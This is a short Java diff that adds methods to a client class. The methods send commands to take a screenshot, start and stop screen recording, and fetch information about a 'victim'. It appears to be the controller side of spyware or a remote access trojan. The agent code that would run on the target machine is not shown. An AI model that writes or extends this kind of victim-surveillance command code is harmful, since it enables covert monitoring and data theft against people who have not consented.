@@ -183,4 +183,36 @@ public class User extends Client {
         sendMessage(query);
     }
 
+    void sendTakeScreen(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.screen");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendStartRecordScreen(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "start.record.screen");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendStopRecordScreen(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "stop.record.screen");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendGetVictimInfo(JSONObject info, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.victim.info");
+        query.put("info", info);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
 }
